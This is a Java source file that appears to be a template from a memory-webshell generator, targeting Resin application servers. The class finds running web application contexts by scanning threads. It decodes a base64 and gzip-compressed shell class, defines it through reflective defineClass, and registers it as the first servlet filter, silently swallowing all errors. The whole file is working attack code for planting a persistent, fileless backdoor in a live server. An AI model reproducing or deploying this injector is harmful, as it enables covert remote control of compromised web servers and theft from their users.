package org.leo.jmg.mem.injectortpl.resin;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class ResinFilterInjector {

    
    private static boolean ok = false;

    private static String shellClassName;
    private static String shellClass;
    private static String urlPattern;

    public ResinFilterInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            
        }
        if (contexts == null || contexts.isEmpty()) {
           
        } else {
            for (Object context : contexts) {
                try {
                    
                    Object shell = getShell(context);
                    inject(context, shell);
                   
                } catch (Throwable e) {
                    
                }
            }
        }
        ok = true;
        shellClass = null;
        shellClassName = null;
        urlPattern = null;
    }


    /**
     * com.caucho.server.webapp.Application
     * /usr/local/resin3/lib/resin.jar
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            Class<?> servletInvocationClass = null;
            try {
                servletInvocationClass = thread.getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
            } catch (Exception e) {
                continue;
            }
            if (servletInvocationClass != null) {
                Object contextRequest = servletInvocationClass.getMethod("getContextRequest").invoke(null);
                Object webApp = invokeMethod(contextRequest, "getWebApp", new Class[0], new Object[0]);
                contexts.add(webApp);
            }
        }
        return contexts;
    }

    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "_classLoader"));
        }
    }

    
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(shellClassName);
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        return clazz.newInstance();
    }

    private void inject(Object context, Object filter) throws Exception {
        Map<String, Object> filters = (Map) getFieldValue(getFieldValue(context, "_filterManager"), "_filters");
        for (String key : filters.keySet()) {
            if (key.contains(shellClassName)) {
                return;
            }
        }
        Class<?> filterMappingClass = context.getClass().getClassLoader().loadClass("com.caucho.server.dispatch.FilterMapping");
        Object filterMappingImpl = filterMappingClass.newInstance();
        invokeMethod(filterMappingImpl, "setFilterName", new Class[]{String.class}, new Object[]{shellClassName});
        invokeMethod(filterMappingImpl, "setFilterClass", new Class[]{String.class}, new Object[]{shellClassName});
        Object urlPatternObj = invokeMethod(filterMappingImpl, "createUrlPattern", null, null);
        invokeMethod(urlPatternObj, "addText", new Class[]{String.class}, new Object[]{urlPattern});
        invokeMethod(urlPatternObj, "init", null, null);
        invokeMethod(context, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMappingImpl});

        List filterMappings = (List) getFieldValue(getFieldValue(context, "_filterMapper"), "_filterMap");
        filterMappings.remove(filterMappingImpl);
        filterMappings.add(0, filterMappingImpl);

        invokeMethod(context, "clearCache", null, null);
    }


    
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }


}